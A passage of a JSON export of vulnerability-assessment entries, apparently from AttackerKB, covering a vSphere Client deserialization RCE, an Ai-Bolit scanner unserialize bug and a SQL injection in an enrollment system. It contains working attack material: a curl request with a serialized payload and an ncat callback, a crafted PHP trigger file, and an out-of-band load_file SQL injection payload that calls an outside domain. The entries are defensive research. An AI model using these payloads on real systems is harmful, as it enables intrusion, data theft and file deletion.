org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:616)\r\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)\r\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:831)\r\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1634)\r\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\r\n\tat java.lang.Thread.run(Thread.java:748)\r\n```\r\n\r\n## Testing RCE by forcing it in a debugger, lol\r\n\r\n```\r\nwvu@kharak:~$ curl -kv https://172.16.57.237/vsphere-client/download/logs -d \"webClientSessionId=nope&SelectedLogsSpec=Cgczc3VuLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlZgALMTcyLjE2LjU3LjEAABFcAAAAAHyVTXIAAAAAAAAAAAAAAAAAAAA=\"\r\n*   Trying 172.16.57.237:443...\r\n* Connected to 172.16.57.237 (172.16.57.237) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384\r\n* ALPN, server did not agree to a protocol\r\n* Server certificate:\r\n*  subject: CN=172.16.57.237; C=US\r\n*  start date: Nov 30 23:59:14 2021 GMT\r\n*  expire date: Dec  1 11:59:14 2023 GMT\r\n*  issuer: CN=CA; DC=vsphere; DC=local; C=US; ST=California; O=photon-machine; OU=VMware Engineering\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n> POST /vsphere-client/download/logs HTTP/1.1\r\n> Host: 172.16.57.237\r\n> User-Agent: curl/7.80.0\r\n> Accept: */*\r\n> Content-Length: 133\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n```\r\n\r\n```\r\nBreakpoint hit: \"thread=http-nio-9090-exec-10\", flex.messaging.util.ClassUtil.validateCreation(), line=351 bci=76\r\n351        if (!valid) {\r\n\r\nhttp-nio-9090-exec-10[1] print valid\r\n valid = false\r\nhttp-nio-9090-exec-10[1] set valid = true\r\n valid = true = true\r\nhttp-nio-9090-exec-10[1] cont\r\n>\r\n```\r\n\r\n```\r\nwvu@kharak:~$ ncat -lkv 4444\r\nNcat: Version 7.92 ( https://nmap.org/ncat )\r\nNcat: Listening on :::4444\r\nNcat: Listening on 0.0.0.0:4444\r\nNcat: Connection from 172.16.57.237.\r\nNcat: Connection from 172.16.57.237:41660.\r\nJRMIK\r\n```\r\n\r\n## Listing the allowed class patterns for future work\r\n\r\n```\r\nDataService.util.*\r\n\\[B\r\n\\[Ljava.lang.Object;\r\nantrun.*\r\ncis.ds.*\r\nclasses.*\r\nclasses.com.vmware.vim.binding.phonehome.*\r\nclasses.com.vmware.vim.sso.*\r\ncom.vmware.*\r\nflex.messaging.io.ArrayCollection\r\nflex.messaging.io.ArrayList\r\nflex.messaging.io.amf.ASObject\r\nflex.messaging.io.amf.SerializedObject\r\nflex.messaging.messages.AcknowledgeMessage\r\nflex.messaging.messages.AcknowledgeMessageExt\r\nflex.messaging.messages.AsyncMessage\r\nflex.messaging.messages.AsyncMessageExt\r\nflex.messaging.messages.CommandMessage\r\nflex.messaging.messages.CommandMessageExt\r\nflex.messaging.messages.ErrorMessage\r\nflex.messaging.messages.HTTPMessage\r\nflex.messaging.messages.RemotingMessage\r\nflex.messaging.messages.SOAPMessage\r\njava.lang.Boolean\r\njava.lang.Byte\r\njava.lang.Character\r\njava.lang.Double\r\njava.lang.Float\r\njava.lang.Integer\r\njava.lang.Long\r\njava.lang.Object\r\njava.lang.Short\r\njava.lang.String\r\njava.util.ArrayList\r\njava.util.Date\r\njava.util.HashMap\r\nlib.*\r\nmetadata.*\r\nmozilla.*\r\norg.apache.commons.net.*\r\norg.apache.commons.net.bsd.*\r\norg.apache.commons.net.chargen.*\r\norg.apache.commons.net.daytime.*\r\norg.apache.commons.net.discard.*\r\norg.apache.commons.net.echo.*\r\norg.apache.commons.net.finger.*\r\norg.apache.commons.net.ftp.*\r\norg.apache.commons.net.ftp.parser.*\r\norg.apache.commons.net.imap.*\r\norg.apache.commons.net.io.*\r\norg.apache.commons.net.nntp.*\r\norg.apache.commons.net.ntp.*\r\norg.apache.commons.net.pop3.*\r\norg.apache.commons.net.smtp.*\r\norg.apache.commons.net.telnet.*\r\norg.apache.commons.net.tftp.*\r\norg.apache.commons.net.time.*\r\norg.apache.commons.net.util.*\r\norg.apache.commons.net.whois.*\r\norg.json.*\r\norg.w3c.dom.Document\r\nschema.*\r\n```",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "b0d2a354-029b-4066-8337-7102306a5278",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "53325e2a-1857-4468-992c-f488ed7c3c67",
      "created": "2021-12-06T20:37:38.454125Z",
      "revisionDate": "2022-01-05T17:06:33.356357Z",
      "document": "This is an interesting vulnerability in the Ai-Bolit AV scanner functionality of CloudLinux Inc Imunify360 running Ai-Bolit prior to AI-Bolit 31.1.2-1, Interestingly whilst it was stated that 30.8.8-1, 30.8.9-1, 30.10.3-1, 31.0.3-1, and 31.1.1-1 were affected, in my testing the Ubuntu dpkg files that were available on CloudLinux's servers only contained versions 30.10.3-1 and later, and surprisingly only 30.10.3-1 actually contained the vulnerability. All later versions were found to be patched. Older versions were not found on the server so it was not possible to obtain a copy of these affected versions, however it is likely they were also affected and the patch was either introduced with 31.10.3-1 or was introduced with 31.1.2-1 and then backported to versions 30.10.3-1 and later.\r\n\r\nNote that the software used to be at https://repo.imunify360.cloudlinux.com/imunify360/ubuntu/20.04/pool/main/a/ai-bolit/ as `ai-bolit_30.10.3-1_amd64.deb` however it appears it has since been removed. If you need a copy of this file please feel free to reach out.\r\n\r\nWorking from the original PoC at https://talosintelligence.com/vulnerability_reports/TALOS-2021-1383 we can see that the vulnerability occurs due to an `unserialize()` call within `deobfuscateDecodedFileGetContentsWithFunc($str, $matches)` where the line `$resCode = implode(' ', @unserialize(base64_decode($matches[5])));` is executed, which first base64 decodes the 5th match, which contains a subset of the attacker controlled file that is being scanned, Base64 decodes it, and then passes it, unchecked, into a call to `unserialize()`.\r\n\r\nTracing back we can see that there is a regex in the Obfuscator class associated with the ID `decodedFileGetContentsWithFunc()`. This is the regex that is used to scan the file, and then if any patterns are found that match this regex, then `deobfuscateDecodedFileGetContentsWithFunc()` is called to deobfuscate the file.\r\n\r\n```\r\nfunction\\s(\\w{1,50})\\((\\$\\w{1,50})\\)\\s?{.*?\\$\\w+\\s?=\\s?\"[^\"]+\";\\$\\w{1,50}\\s?=\\s?str_split\\(\\$\\w{1,50}\\);\\$\\w{1,50}\\s?=\\s?array_flip\\(\\$\\w{1,50}\\);\\$\\w{1,50}\\s?=\\s?0;\\$\\w{1,50}\\s?=\\s?\"\";\\$\\w{1,50}\\s?=\\s?preg_replace\\(\"[^\"]+\",\\s?\"\",\\s?\\$\\w{1,50}\\);do\\s?{(?:\\$\\w{1,50}\\s?=\\s?\\$\\w{1,50}\\[\\$\\w{1,50}\\[\\$\\w{1,50}\\+\\+\\]\\];){4}\\$\\w{1,50}\\s?=\\s?\\(\\$\\w{1,50}\\s?<<\\s?2\\)\\s?\\|\\s?\\(\\$\\w{1,50}\\s?>>\\s?4\\);\\$\\w{1,50}\\s?=\\s?\\(\\(\\$\\w{1,50}\\s?&\\s?15\\)\\s?<<\\s?4\\)\\s?\\|\\s?\\(\\$\\w{1,50}\\s?>>\\s?2\\);\\$\\w{1,50}\\s?=\\s?\\(\\(\\$\\w{1,50}\\s?&\\s?3\\)\\s?<<\\s?6\\)\\s?\\|\\s?\\$\\w{1,50};\\$\\w{1,50}\\s?=\\s?\\$\\w{1,50}\\s?\\.\\s?chr\\(\\$\\w{1,50}\\);if\\s?\\(\\$\\w{1,50}\\s?!=\\s?64\\)\\s?{\\$\\w{1,50}\\s?=\\s?\\$\\w{1,50}\\s?\\.\\s?chr\\(\\$\\w{1,50}\\);}if\\s?\\(\\$\\w{1,50}\\s?!=\\s?64\\)\\s?{\\$\\w{1,50}\\s?=\\s?\\$\\w{1,50}\\s?\\.\\s?chr\\(\\$\\w{1,50}\\);}}\\s?while\\s?\\(\\$\\w{1,50}\\s?<\\s?strlen\\(\\$\\w{1,50}\\)\\);return\\s?\\$\\w{1,50};}\\s?.*?function\\s(\\w{1,50})\\(\\){\\$\\w{1,50}\\s?=\\s?@file_get_contents\\(\\w{1,50}\\(\\)\\);.*?(\\$\\w{1,50})\\s?=\\s?\"([^\"]{1,20000})\";.*?\\4\\s?=\\s?@unserialize\\(\\1\\(\\4\\)\\);.*?(function\\s(\\w{1,50})\\(\\$\\w{1,50}=NULL\\){foreach\\s?\\(\\3\\(\\)\\s?as.*?eval\\(\\$\\w{1,50}\\);}}}).*?(\\7\\(\\);)\r\n```\r\n\r\nAfter a lot of time spent manually going through the regex using regex101.com I was able to recreate a file that would trigger the regex and result in deserialization:\r\n\r\n```\r\n<?php\r\nfunction func1($param){ $asdf = \"cool\";$asc = str_split($foobar);$word = array_flip($asc);$food = 0;$cored=\"\";$bored=preg_replace(\"asdf\", \"\", $deda);do {$asdf = $asdf[$acfd[$foa++]];$asdf = $asdf[$acfd[$foa++]];$asdf = $asdf[$acfd[$foa++]];$asdf = $asdf[$acfd[$foa++]];$coolio=($joko << 2) | ($foko >> 4);$cood = (($aed & 15) << 4) | ($ave >> 2);$aesd = (($ke & 3) << 6) | $hes;$hec = $hek . chr($jok);if ($asdf != 64) {$foobd = $coor . chr($foj);}if ($hdo != 64) {$fed = $asdf . chr($ase);}} while ($asdfas < strlen($ddhdh));return $asdfe;} function func2(){$corlan = @file_get_contents(asdfasdf()); $variable1 = \"INSERTTHEPAYLOADHEREBASE64ENCODED\"; $variable1 = @unserialize(func1($variable1)); function func3($faccc=NULL){foreach (func2() as eval($fjdjd);}}} func3();\r\n?>\r\n```\r\n\r\nNote that most names are junk however anything with `variable1` or `func1` is specifically named as such (the string \"variable\" or \"func\" followed by a number) as they need to be the same name everywhere they are used. This is due to the regex using some of the results from earlier checks later on in its code, so the names of these functions or variables must remain the same otherwise the regex won't match.\r\n\r\nNow whilst deserialization attacks can result in RCE, arbitrary file deletion, or otherwise remember that it really depends what classes are available to the end user. In my experiments I found the following classes were available when the `unserialize()` call was made:\r\n\r\n```\r\nstdClass\r\nException\r\nErrorException\r\nError\r\nCompileError\r\nParseError\r\nTypeError\r\nArgumentCountError\r\nArithmeticError\r\nDivisionByZeroError\r\nClosure\r\nGenerator\r\nClosedGeneratorException\r\nWeakReference\r\nDateTime\r\nDateTimeImmutable\r\nDateTimeZone\r\nDateInterval\r\nDatePeriod\r\nLibXMLError\r\nCURLFile\r\nHashContext\r\nGMP\r\nLogicException\r\nBadFunctionCallException\r\nBadMethodCallException\r\nDomainException\r\nInvalidArgumentException\r\nLengthException\r\nOutOfRangeException\r\nRuntimeException\r\nOutOfBoundsException\r\nOverflowException\r\nRangeException\r\nUnderflowException\r\nUnexpectedValueException\r\nRecursiveIteratorIterator\r\nIteratorIterator\r\nFilterIterator\r\nRecursiveFilterIterator\r\nCallbackFilterIterator\r\nRecursiveCallbackFilterIterator\r\nParentIterator\r\nLimitIterator\r\nCachingIterator\r\nRecursiveCachingIterator\r\nNoRewindIterator\r\nAppendIterator\r\nInfiniteIterator\r\nRegexIterator\r\nRecursiveRegexIterator\r\nEmptyIterator\r\nRecursiveTreeIterator\r\nArrayObject\r\nArrayIterator\r\nRecursiveArrayIterator\r\nSplFileInfo\r\nDirectoryIterator\r\nFilesystemIterator\r\nRecursiveDirectoryIterator\r\nGlobIterator\r\nSplFileObject\r\nSplTempFileObject\r\nSplDoublyLinkedList\r\nSplQueue\r\nSplStack\r\nSplHeap\r\nSplMinHeap\r\nSplMaxHeap\r\nSplPriorityQueue\r\nSplFixedArray\r\nSplObjectStorage\r\nMultipleIterator\r\nReflectionException\r\nReflection\r\nReflectionFunctionAbstract\r\nReflectionFunction\r\nReflectionGenerator\r\nReflectionParameter\r\nReflectionType\r\nReflectionNamedType\r\nReflectionMethod\r\nReflectionClass\r\nReflectionObject\r\nReflectionProperty\r\nReflectionClassConstant\r\nReflectionExtension\r\nReflectionZendExtension\r\nReflectionReference\r\nSessionHandler\r\n__PHP_Incomplete_Class\r\nphp_user_filter\r\nDirectory\r\nAssertionError\r\nSimpleXMLElement\r\nSimpleXMLIterator\r\nLevelDB\r\nLevelDBWriteBatch\r\nLevelDBIterator\r\nLevelDBSnapshot\r\nLevelDBException\r\nJsonException\r\nAibolitHelpers\r\nVariables\r\nLogger\r\nLoadSignaturesForScan\r\nInternalSignatures\r\nCmsVersionDetector\r\nCloudAssistedRequest\r\nReport\r\nJSONReport\r\nPHPReport\r\nPlainReport\r\nCSVReport\r\nDoublecheckReport\r\nHTMLReport\r\nCloudAssistedFiles\r\nDetachedMode\r\nResidentMode\r\nDebugMode\r\nFileInfo\r\nHashTable\r\nFinder\r\nFileFilter\r\nScanList\r\nScanner\r\nScanUnit\r\nScanCheckers\r\nTemplateList\r\nTranslateList\r\nUserList\r\nHyperScan\r\nPerfomanceStats\r\nProgress\r\nOsReleaseInfo\r\nFileHashMemoryDb\r\nFilepathEscaper\r\nStringToStreamWrapper\r\nNormalization\r\nEncoding\r\nRapidScanStorageRecord\r\nRapidScanStorage\r\nCloudAssistedStorage\r\nRapidAccountScan\r\nDbFolderSpecification\r\nLevelDBWrap\r\nCriticalFileSpecification\r\nHelpers\r\nMathCalc\r\nFuncCalc\r\nDeobfuscator\r\nSharedMem\r\nFactory\r\nTemplate\r\nTranslate\r\n```\r\n\r\nUnfortunately of these I was mainly only able to find cases where deserializing an object would cause file deletion. In cases where file creation was possible, it was either in a fixed location with a nonexecutable extension, or more often than not the content of the file would be a fixed string which wasn't useful for the purposes of exploitation.\r\n\r\nThe most promising class appeared to be CloudAssistedFiles which could cause a CURL request to be made, however it appears that the URL, as well as the contents of the request could not be controlled, so unfortunately there would not be any way to retrieve data from the server from what I could tell.\r\n\r\nArbitrary file deletion can be achieved via the Logger class and the `$log_file` parameter of the `__construct` function.\r\n\r\nAt the end of the research I was not able to form a useful payload for this vulnerability. In my opinion, given what I saw so far, the most likely possibility for exploitation would be that someone used the exploit chain to delete something like `.htaccess` and then abuse that to bypass a file upload filter or similar. \r\n\r\nHowever this is highly dependent on the application and a variety of other factors, vs this being a bug that can be installed purely by virtue of having Ai-Bolit AV scanner installed.\r\n\r\nA final important note is that CloudLinux Inc Imunify360 is, by default, configured to check for updates automatically once daily. This means its very likely that most installations in the wild are up to date, and I personally noticed this when trying to find servers with Imunify360 installed, as most of these servers were running up to date versions of Imunify360 or one of its respective components.",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cabd4a59-3026-422d-a1a1-8864b98ed412",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "657986ac-b61c-4015-bef3-de60039f33fc",
      "created": "2021-12-08T10:37:38.575634Z",
      "revisionDate": "2023-05-17T07:48:32.488093Z",
      "document": "## [CVE-2021-41646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41646)\r\n\r\n## [Vendor](https://www.sourcecodester.com/php/12937/online-reviewer-system-using-phppdo.html)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2021-41646/docs/Screenshot%202021-12-08%20113728-wall.png)\r\n\r\n## Description:\r\nRemote Code Execution (RCE) vulnerability exists in Sourcecodester Online Reviewer System 1.0 by uploading a maliciously crafted PHP file that bypasses the image upload filters.\r\nThe vulnerable directory can be used by the directory traversal method in the browser from the attacker to retrieve sensitive information or destroy the system by using an RCE method for this action!\r\nStatus: CRITICAL\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-41646)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2021/12/cve-2021-41646.html)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "33d5edf8-c2e7-4f4b-80bc-0b36962511e6",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "464da9c2-d2a6-4f5b-bbdb-9cc214978f35",
      "created": "2021-12-08T15:39:23.050006Z",
      "revisionDate": "2021-12-10T17:19:58.334241Z",
      "document": "For crying out loud people, it's silly that this has it's own CVE. It's a documented feature that the Pi has a default password. So do lots of other things.",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c6a98cd3-52ab-4d9d-b349-27325fc1b6ca",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "72cd807d-e26d-4f68-8717-436863b7f8b1",
      "created": "2021-12-08T19:41:53.102852Z",
      "revisionDate": "2021-12-08T19:48:47.070192Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/qv2aD8YfMN/cve-2021-44077/rapid7-analysis).",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fa2b5153-c731-4333-bc65-85f32551fc49",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "0b6c144f-2e5a-4d5e-b629-e45c2530cb94",
      "created": "2021-12-10T18:39:51.718827Z",
      "revisionDate": "2022-01-14T02:19:04.268064Z",
      "document": "Seemingly ubiquitous logging library\u2014vulnerable implementations are going to be widespread. Multiple PoC exploits are publicly available, and broad opportunistic attacks already occurring, but I'd expect with all the different implementations, we'll be seeing new attack vectors for weeks or months to come. Update all your dependencies ASAP, and/or take systems and services with known-vulnerable implementations offline right away. Exploitation sure to increase even further. https://www.rapid7.com/blog/post/2021/12/10/widespread-exploitation-of-critical-remote-code-execution-in-apache-log4j/",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "6678c49e-1052-46fd-9102-6818190988ef",
      "editorId": "2351954f-610b-421c-8a62-792e9c5e5225",
      "topicId": "0b6c144f-2e5a-4d5e-b629-e45c2530cb94",
      "created": "2021-12-10T22:48:12.158435Z",
      "revisionDate": "2021-12-10T22:48:12.158177Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "02b90bbf-d606-47f5-a68c-197a25820887",
      "editorId": "5b9afbc1-16ec-4b23-a5ff-ab98d7830129",
      "topicId": "0b6c144f-2e5a-4d5e-b629-e45c2530cb94",
      "created": "2021-12-12T08:47:42.147692Z",
      "revisionDate": "2021-12-22T22:27:01.830966Z",
      "document": "New zero-day, aka Log4Shell or LogJam, is an unauthenticated remote code execution issue enabling full system compromise. CVE-2021-44228 analysis shows that all systems running Log4j 2.0-beta9 through 2.14.1 are vulnerable. Moreover, since the security issue impacts the default configs for most of Apache frameworks, such as Apache Struts2, Apache Solr, Apache Druid, Apache Flink, a wide range of software and web apps used by both enterprises and individual users are exposed to the attacks. ",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "363831bb-b0bc-44f4-81a9-ef7afe479738",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "6dded1e9-1b1a-4034-86ad-5de1e40b3abf",
      "created": "2021-12-13T16:45:09.565276Z",
      "revisionDate": "2023-05-17T07:54:23.6302Z",
      "document": "## [Online-Enrollment-Management-System](https://www.sourcecodester.com/php/12914/online-enrollment-management-system-paypal-payments-phpmysqli.html)\r\n\r\n## [Vendor](https://www.sourcecodester.com/users/janobe)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/janobe/Online-Enrollment-Management-System/docs/student_side_account.png)\r\n\r\n## Description:\r\nThe id parameter from Online Enrollment Management System 1.0 appears to be vulnerable to SQL injection attacks. \r\nThe payload (select load_file('\\\\\\\\5bhtyx01jb7u7d6h2uthd4khq8w1ktch3jrbe12q.nu11secur1typentestingengineer.net\\\\ofp')) was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a [UNC](https://www.pcmag.com/encyclopedia/term/unc) file path that references a URL on an external domain. \r\nThe application interacted with that domain, indicating that the injected SQL query was executed. \r\nThe attacker can retrieve sensitive information for all users of this system. \r\nSTATUS: Critical and Awful.\r\n\r\n## Mysql Request:\r\n\r\n```mysql\r\nPOST /onlineenrolmentsystem/menu1.php HTTP/1.1\r\nHost: 192.168.10.73\r\nOrigin: http://192.168.10.73\r\nCookie: PHPSESSID=5hjqmc8ms45586p1rqdv1ld9gd\r\nAccept: text/plain, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nReferer: http://192.168.10.73/onlineenrolmentsystem/index.php?q=department\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Length: 5\r\n\r\nid=(select%20load_file('%5c%5c%5c%5c5bhtyx01jb7u7d6h2uthd4khq8w1ktch3jrbe12q.nu11secur1typenetrationtestingengineer.net%5c%5cofp'))\r\n```\r\n\r\n## MySQL Response:\r\n\r\n```mysql\r\nHTTP/1.1 200 OK\r\nDate: Fri, 03 Dec 2021 12:11:35 GMT\r\nServer: Apache/2.4.51 (Win64) OpenSSL/1.1.1l PHP/7.4.24\r\nX-Powered-By: PHP/7.4.24\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nContent-Length: 159\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n\r\n<!-- Projects Row -->\r\n<div class=\"row\">\r\n<div class=\"col-md-12\">\r\n<ul>\r\n\r\n\r\n</ul>\r\n</div>\r\n</div>\r\n<!-- /.row -->\r\n```\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/Online-Enrollment-Management-System)\r\n\r\n## Proof and Exploit:\r\n[href](https://www.nu11secur1ty.com/2021/12/online-enrollment-management-system-sql.html)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
